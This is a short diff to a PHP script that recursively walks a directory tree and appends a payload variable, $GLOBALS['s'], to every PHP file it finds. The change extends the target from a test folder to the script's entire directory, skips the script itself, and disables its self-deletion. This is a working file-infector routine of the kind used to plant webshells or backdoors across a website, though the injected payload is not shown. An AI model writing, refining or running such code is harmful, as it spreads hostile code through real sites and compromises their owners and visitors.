@@ -9,17 +9,19 @@ function walkfiles($path){
             walkfiles($path.DIRECTORY_SEPARATOR.$afile);
         } else {
             $filename = $path.DIRECTORY_SEPARATOR.$afile;
-            $file_ext  = pathinfo($filename,PATHINFO_EXTENSION);
-            if( strtolower( $file_ext ) == "php"){
-                try{
-                    file_put_contents($filename,$GLOBALS['s'],FILE_APPEND);
-                }catch(Exception $e){
-                    //pass
+            if($filename!==__FILE__){
+                $file_ext  = pathinfo($filename,PATHINFO_EXTENSION);
+                if( strtolower( $file_ext ) ==='php'){
+                    try{
+                        file_put_contents($filename,$GLOBALS['s'],FILE_APPEND);
+                    }catch(Exception $e){
+                        //pass
+                    }
                 }
             }
         }
     }
 } 
-walkfiles(__DIR__.'/test/');
-unlink(__FILE__);
+walkfiles(__DIR__);
+// unlink(__FILE__);
 ?>
